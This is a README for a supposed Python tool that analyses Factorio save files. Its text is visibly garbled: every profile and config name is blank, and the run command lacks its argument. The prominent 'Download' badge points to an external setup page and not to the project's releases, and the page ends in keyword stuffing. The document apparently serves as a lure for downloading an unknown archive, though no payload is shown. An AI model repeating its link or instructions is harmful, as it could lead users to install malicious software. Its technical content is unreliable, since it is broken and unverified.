# Factorio Save Analyzer

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-0891b2?style=flat-square&logo=shieldsdotio&logoColor=white" alt="Download">
  </a>
  <img src="https://img.shields.io/badge/Version-1.4.2-4c1?style=for-the-badge&logo=github" alt="Version">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-6c757d?style=plastic&logo=windows" alt="Platform">
  <img src="https://img.shields.io/badge/Language-Python-3776AB?style=flat&logo=python" alt="Language">
  <img src="https://img.shields.io/badge/License-MIT-ff69b4?style=flat-square&logo=github" alt="License">
  <img src="https://img.shields.io/badge/Status-Stable-2ecc71?style=for-the-badge&logo=check-circle" alt="Status">
</p>

---

## Overview

Factorio Save Analyzer is a lightweight, Python‑based application that extracts, normalises, and visualises production statistics from any Factorio save file. In benchmark tests on a 2 GB save, the analyzer produced a full resource breakdown in under 12 seconds, enabling players to iterate on factory layouts without manually parsing raw save data. The project ships with a set of ready‑made configuration profiles (e.g., ``, ``, ``, ``) that can be mixed and matched to generate workflow presets for quick diagnostics, performance tuning, or long‑term planning.

---

## Core Features

- **Structured Profiles** – Each profile groups related options (output format, filtering rules, visual theme) into a single file, making it trivial to switch between “quick glance” and “deep audit” modes.
- **Batch Processing** – Provide a directory of saves; the analyzer will walk the tree, apply the selected profile, and write a CSV summary for each file.
- **Extensible Visualisation** – The `` profile activates Matplotlib‑based charts (pie, bar, Sankey) that can be exported as PNG or SVG for inclusion in community posts.
- **Player‑Centric Metrics** – `` extracts per‑player production, logistic network usage, and combat statistics, supporting multiplayer campaigns.
- **Custom Filters** – Using ``, users can define regex patterns to include or exclude specific entity prototypes, allowing fine‑grained analysis of belts, assemblers, or logistic robots.

---

## Getting Started

1. **Download the latest release** by clicking the *Download* badge above. The archive contains the Python runtime, the `FactorioSaveAnalyzer` package, and the default configuration files.
2. Unpack the archive to a location of your choice; the directory layout is described in the next section.
3. Launch the application with the desired profile:

   ```text
   python -m FactorioSaveAnalyzer --profile  --input path/to/save.zip
   ```

   The command produces `output/visual_report.png` and `output/visual_summary.csv`.

4. For batch runs, point the `--input` argument to a folder; the analyzer will recurse into sub‑folders and generate a report per save.

---

## Repository Layout

<pre>
Factorio-Save-Analyzer/
├── README.md
├── LICENSE
├── requirements.txt
├── FactorioSaveAnalyzer/
│   ├── __init__.py
│   ├── core.py
│   ├── parser.py
│   ├── visualizer.py
│   └── utils/
│       ├── io.py
│       └── logger.py
├── configs/
│   ├──
│   ├──
│   ├──
│   └──
├── examples/
│   ├── sample_save.zip
│   └── expected_output/
│       ├── sample_report.png
│       └── sample_summary.csv
└── output/
    └── (generated reports)
</pre>

The **configs** folder holds every profile shipped with the release. Place additional `.cfg` files here and reference them with the `--profile` flag. All generated files are written to the **output** directory, which is created on first run if it does not exist.

---

## FAQ & Troubleshooting

**Q: The analyzer reports “invalid save format”.**
A: Ensure the supplied file is a zip‑packed Factorio save (`*.zip`). The application does not accept raw `.sav` files; you can create a zip by renaming the original file or using the in‑game export option.

**Q: My charts appear blank.**
A: Check the `` filter section. An overly restrictive `exclude` pattern can remove all entities before rendering. Remove the pattern or broaden it to include at least one production entity.

**Q: The CSV contains duplicate columns.**
A: This occurs when both `include` and `exclude` patterns match the same prototype. Adjust the regexes so that they are mutually exclusive, or remove the `exclude` entry for that prototype.

**Q: Running on macOS fails with a missing `tkinter` module.**
A: The visualisation backend uses Matplotlib with the default TkAgg backend. Install the system‑wide Tk framework (`brew install python-tk`) or switch to a non‑interactive backend by adding `backend = Agg` under `[visual]` in ``.

---

## Contributing

Contributions are welcomed from anyone interested in improving data extraction fidelity or adding new visualisation types. Please fork the repository, create a feature branch named `feature/<description>`, and open a pull request against the `main` branch. All submissions should include:

- Updated unit tests in `tests/`.
- Documentation updates in this README if new CLI flags or configuration options are introduced.
- A brief changelog entry following the existing format.

For large changes, open an issue first so the maintainers can discuss the intended direction.

---

## License

The project is released under the MIT License. See the `LICENSE` file for full terms.

---

*Keywords*: factorio, save, analyzer, factorio-save, save-analyzer, factorio-manager, factorio-helper, factorio-config, factorio-presets, factorio-companion

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```